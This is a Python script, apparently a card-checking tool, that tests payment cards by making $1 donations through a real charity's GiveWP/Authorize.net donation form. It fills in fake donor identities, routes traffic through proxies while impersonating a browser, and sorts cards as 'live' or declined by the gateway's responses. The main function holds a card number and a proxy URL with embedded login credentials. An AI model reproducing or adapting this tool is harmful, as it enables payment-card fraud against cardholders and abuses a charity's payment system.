import re
import json
import asyncio
import uuid
from urllib.parse import urlparse, parse_qs
from faker import Faker
from curl_cffi.requests import AsyncSession

fake = Faker("en_US")

class tools:
    @staticmethod
    def getcard(card: str) -> dict:
        parts = card.split("|")
        cc = parts[0].strip() if len(parts) > 0 else ""
        mm = parts[1].strip() if len(parts) > 1 else ""
        yy = parts[2].strip() if len(parts) > 2 else ""
        cvv = parts[3].strip() if len(parts) > 3 else ""
        
        mm = mm.zfill(2)
        
        if len(yy) == 4:
            yy = yy[-2:]
        elif len(yy) == 2:
            yy = yy
            
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}


    @staticmethod
    def find_between(s: str, first: str, last: str) -> str | None:
        try:
            return s.split(first, 1)[1].split(last, 1)[0]
        except (IndexError, AttributeError):
            return None

    @staticmethod
    def userdata() -> dict:
        fn = fake.first_name()
        ln = fake.last_name()
        return {
            "name": f"{fn} {ln}",
            "first": fn,
            "last": ln,
            "address": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip": fake.postcode(),
            "email": f"{fn.lower()}.{ln.lower()}@gmail.com",
            "phone": fake.phone_number(),
        }

    @staticmethod
    def get_card_type(cc_first: str) -> str:
        if not cc_first:
            return "visa"
        return {"3": "american-express", "5": "master-card", "6": "discover"}.get(cc_first[0], "visa")

RESPONSE_MAP = {
    '"responseCode":"1"': ("Success", "Charged - Approved ✅", True),
    '"resultCode":"Ok"': ("Success", "Charged - Approved ✅", True),
    "insufficient fund": ("Declined", "Insufficient Funds ❌", False),
    "insufficient_funds": ("Declined", "Insufficient Funds ❌", False),
    "credit limit": ("Declined", "Credit Limit Exceeded ❌", False),
    "exceeds balance": ("Declined", "Exceeds Balance ❌", False),
    "over credit limit": ("Declined", "Over Credit Limit ❌", False),
    "exceeds withdrawal": ("Declined", "Exceeds Withdrawal ❌", False),
    "expired": ("Declined", "Expired Card ❌", False),
    "expired_card": ("Declined", "Expired Card ❌", False),
    '"errorCode":"8"': ("Declined", "Expired Card ❌", False),
    '"errorCode":"6"': ("Declined", "Invalid Card Number ❌", False),
    "card number is invalid": ("Declined", "Invalid Card Number ❌", False),
    "invalid_card": ("Declined", "Invalid Card Number ❌", False),
    '"errorCode":"7"': ("Declined", "Invalid Expiration Date ❌", False),
    "expiration date is invalid": ("Declined", "Invalid Expiration Date ❌", False),
    "invalid_or_restricted_card": ("Declined", "Invalid Or Restricted Card ❌", False),
    "lost_or_stolen": ("Declined", "Lost Or Stolen ❌", False),
    '"errorCode":"4"': ("Declined", "Lost Or Stolen ❌", False),
    "pick up card": ("Declined", "Lost Or Stolen ❌", False),
    "pickup_card_special_conditions": ("Declined", "Pickup Card Special Conditions ❌", False),
    "cvv2_failure": ("Declined", "CVV2 Failure ❌", False),
    '"errorCode":"65"': ("Declined", "CVV2 Failure ❌", False),
    '"errorCode":"78"': ("Declined", "CVV2 Failure ❌", False),
    "avs mismatch": ("Declined", "AVS Mismatch ❌", False),
    '"errorCode":"27"': ("Declined", "AVS Mismatch ❌", False),
    '"errorCode":"127"': ("Declined", "AVS Mismatch ❌", False),
    '"errorCode":"45"': ("Declined", "AVS + CVV Mismatch ❌", False),
    "the transaction for donation": ("Declined", "the transaction for donation ❌", False),
    "was declined": ("Declined", "Was Declined ❌", False),
    "transaction failed": ("Declined", "Failed ❌", False),
    "suspected_fraud": ("Declined", "Suspected Fraud ❌", False),
    "fraud": ("Declined", "Suspected Fraud ❌", False),
    "security_violation": ("Declined", "Security Violation ❌", False),
    "compliance_violation": ("Declined", "Compliance Violation ❌", False),
    '"errorCode":"250"': ("Declined", "Blocked IP (FDS) ❌", False),
    '"errorCode":"251"': ("Declined", "Fraud Filter Decline ❌", False),
    "cryptographic_failure": ("Declined", "Cryptographic Failure ❌", False),
    "do_not_honor": ("Declined", "Do Not Honor ❌", False),
    '"errorCode":"2"': ("Declined", "Do Not Honor ❌", False),
    "account_closed": ("Declined", "Account Closed ❌", False),
    "payer_account_locked_or_closed": ("Declined", "Payer Account Locked Or Closed ❌", False),
    "account_blocked_by_issuer": ("Declined", "Account Blocked By Issuer ❌", False),
    "invalid_account": ("Declined", "Invalid Account ❌", False),
    "restricted_or_inactive_account": ("Declined", "Restricted Or Inactive Account ❌", False),
    "declined_due_to_updated_account": ("Declined", "Declined Due To Updated Account ❌", False),
    "generic_decline": ("Declined", "Generic Decline ❌", False),
    "order_not_approved": ("Declined", "Order Not Approved ❌", False),
    "transaction_not_permitted": ("Declined", "Transaction Not Permitted ❌", False),
    "invalid_transaction": ("Declined", "Invalid Transaction ❌", False),
    "payment_denied": ("Declined", "Payment Denied ❌", False),
    "payer_cannot_pay": ("Declined", "Payer Cannot Pay ❌", False),
    "reattempt_not_permitted": ("Declined", "Reattempt Not Permitted ❌", False),
    "tx_attempts_exceed_limit": ("Declined", "TX Attempts Exceed Limit ❌", False),
    "transaction_cannot_be_completed": ("Declined", "Transaction Cannot Be Completed ❌", False),
    "declined_please_retry": ("Declined", "Declined Please Retry ❌", False),
    "duplicate": ("Declined", "Duplicate Transaction ❌", False),
    '"errorCode":"11"': ("Declined", "Duplicate Transaction ❌", False),
    '"errorCode":"13"': ("Declined", "Merchant Account Error ❌", False),
    '"errorCode":"17"': ("Declined", "Card Type Not Accepted ❌", False),
    '"errorCode":"3"': ("Declined", "Voice Auth Required ❌", False),
    '"responseCode":"2"': ("Declined", "Declined ❌", False),
    '"responseCode":"3"': ("Declined", "Processing Error ❌", False),
    '"responseCode":"4"': ("Declined", "Held For Review ❌", False),
    '"E00005"': ("Declined", "API Authentication Error ❌", False),
    '"E00006"': ("Declined", "API Authentication Error ❌", False),
    '"E00007"': ("Declined", "API Authentication Error ❌", False),
    '"E00008"': ("Declined", "API Permission Error ❌", False),
    '"E00009"': ("Declined", "API Permission Error ❌", False),
    '"E00010"': ("Declined", "API Permission Error ❌", False),
    '"E00011"': ("Declined", "API Permission Error ❌", False),
}

class Gateway:
    @staticmethod
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        token = str(uuid.uuid4())
        ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"

        async with AsyncSession(impersonate="chrome", proxies=proxies) as session:
            try:
                # Step 1: GET donation form page to extract parameters
                headers_init = {
                    "referer": "https://www.ohelfamily.org/donate/",
                }
                params_init = {
                    "givewp-route": "donation-form-view",
                    "form-id": "794",
                    "locale": "en_US",
                }
                resp_init = await session.get(
                    "https://www.ohelfamily.org/",
                    params=params_init,
                    headers=headers_init,
                )
                html = resp_init.text
                donate_url = tools.find_between(html, '"donateUrl":"', '"')
                if not donate_url:
                    return "Error", "donateUrl not found", False
                clientPublicKey = tools.find_between(html, '"clientPublicKey":"', '"')
                if not clientPublicKey:
                    return "Error", "clientPublicKey not found", False
                apiLoginId = tools.find_between(html, '"apiLoginId":"', '"')
                if not apiLoginId:
                    return "Error", "apiLoginId not found", False

                parsed_url = urlparse(donate_url)
                qs = parse_qs(parsed_url.query)
                route_sig = qs.get('givewp-route-signature', [None])[0]
                route_id = qs.get('givewp-route-signature-id', [None])[0]
                route_exp = qs.get('givewp-route-signature-expiration', [None])[0]
                if not route_sig or not route_id or not route_exp:
                    return "Error", "Missing route signature parameters", False

                # Step 2: Tokenize card via Authorize.net
                headers_auth = {
                    "origin": "https://www.ohelfamily.org",
                    "referer": "https://www.ohelfamily.org/?givewp-route=donation-form-view&form-id=794&locale=en_US",
                    "content-type": "application/json; charset=UTF-8",
                }
                json_auth = {
                    "securePaymentContainerRequest": {
                        "merchantAuthentication": {
                            "name": apiLoginId,
                            "clientKey": clientPublicKey,
                        },
                        "data": {
                            "type": "TOKEN",
                            "id": token,
                            "token": {
                                "cardNumber": card_data["cc"],
                                "expirationDate": f"{card_data['mm']} {card_data['yy']}",
                                "cardCode": card_data["cvv"],
                            },
                        },
                    },
                }
                resp_auth = await session.post(
                    "https://api2.authorize.net/xml/v1/request.api",
                    headers=headers_auth,
                    json=json_auth,
                )
                auth_text = resp_auth.text
                data_value = tools.find_between(auth_text, '"dataValue":"', '"')
                data_descriptor = tools.find_between(auth_text, '"dataDescriptor":"', '"')
                if not data_value or not data_descriptor:
                    return "Error", "Failed to extract dataValue or dataDescriptor", False

                # Step 3: Submit donation form (application/x-www-form-urlencoded)
                headers_donate = {
                    "origin": "https://www.ohelfamily.org",
                    "referer": "https://www.ohelfamily.org/?givewp-route=donation-form-view&form-id=794&locale=en_US",
                }
                params_donate = {
                    "givewp-route": "donate",
                    "givewp-route-signature": route_sig,
                    "givewp-route-signature-id": "givewp-donate",
                    "givewp-route-signature-expiration": route_exp,
                }
                data_donate = {
                    "amount": "1",
                    "currency": "USD",
                    "donationType": "single",
                    "subscriptionPeriod": "one-time",
                    "subscriptionFrequency": "1",
                    "subscriptionInstallments": "0",
                    "formId": "794",
                    "p2pSourceID": "0",
                    "enableTribute": "hide",
                    "tributeType": "In honor of",
                    "tributesSendNotification": "send",
                    "gatewayId": "authorize",
                    "feeRecovery": "0",
                    "p2pSourceType": "",
                    "honorific": "Mr.",
                    "firstName": user_data["first"],
                    "lastName": user_data["last"],
                    "email": user_data["email"],
                    "phone": user_data["phone"],
                    "constantcontact": "true",
                    "country": "US",
                    "address1": user_data["address"],
                    "address2": "",
                    "city": user_data["city"],
                    "state": user_data["state"],
                    "zip": user_data["zip"],
                    "comment": "",
                    "dtd": "undefined",
                    "feeRecoveryConfirmation": "",
                    "donationBirthday": "",
                    "originUrl": "https://www.ohelfamily.org/donate/",
                    "isEmbed": "true",
                    "embedId": "give-form-shortcode-2",
                    "locale": "en_US",
                    "gatewayData[give_authorize_data_descriptor]": data_descriptor,
                    "gatewayData[give_authorize_data_value]": data_value,
                }
                resp_donate = await session.post(
                    "https://www.ohelfamily.org/",
                    params=params_donate,
                    headers=headers_donate,
                    data=data_donate,
                )
                response_text = resp_donate.text.lower()

                # Step 4: Classify using RESPONSE_MAP
                for key, (status, msg, is_live) in RESPONSE_MAP.items():
                    if key in response_text:
                        return status, msg, is_live

                # Fallback: try to parse JSON for deeper error messages
                try:
                    error_data = resp_donate.json()
                    if 'transactionResponse' in error_data:
                        tx = error_data['transactionResponse']
                        if 'errors' in tx:
                            errs = tx['errors']
                            if isinstance(errs, dict) and 'error' in errs:
                                err_text = errs['error'][0].get('errorText', '')
                            elif isinstance(errs, list):
                                err_text = errs[0].get('errorText', '')
                            else:
                                err_text = str(errs)
                            if err_text:
                                return "Declined", f"{err_text} ❌", False
                        elif 'messages' in tx:
                            msgs = tx['messages']
                            if isinstance(msgs, dict) and 'message' in msgs:
                                err_text = msgs['message'][0].get('description', '')
                                if err_text:
                                    return "Declined", f"{err_text} ❌", False
                    elif 'data' in error_data and 'error' in error_data['data']:
                        err_text = error_data['data']['error']
                        return "Declined", f"{err_text} ❌", False
                except:
                    pass

                return "Unknown", "Unrecognised response ❓", False

            except Exception as e:
                return "Error", f"Exception: {str(e)}", False


async def process_Au_1(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
    card_data = tools.getcard(card_line)
    if not card_data["cc"]:
        return "Failed", "Invalid card format", False

    user_data = tools.userdata()
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

    return await Gateway.charge_card(
        card_data=card_data,
        user_data=user_data,
        proxies=proxies,
    )
    
async def main():
    # بطاقة اختبار قياسية لـ Stripe
    test_card = "4211566115568609|12|28|321"
    
    # البروكسي الخاص بك بالصيغة الصحيحة
    proxy = "http://purevpn0s8732217:i67s60ep@Px121102.pointtoserver.com:10780"

    print("🚀 جاري اختبار البوابة (ST Charge)...")
    print(f"💳 البطاقة: {test_card}")
    print(f"🌐 جاري الاتصال عبر: {proxy}")
    
    status, message, is_live = await process_Au_1(test_card, proxy_url=proxy)
    
    print("\n--- نتيجة التنفيذ ---")
    print(f"الحالة  : {status}")
    print(f"الرسالة : {message}")
    print(f"مقبولة  : {is_live}")

if __name__ == "__main__":
    asyncio.run(main())
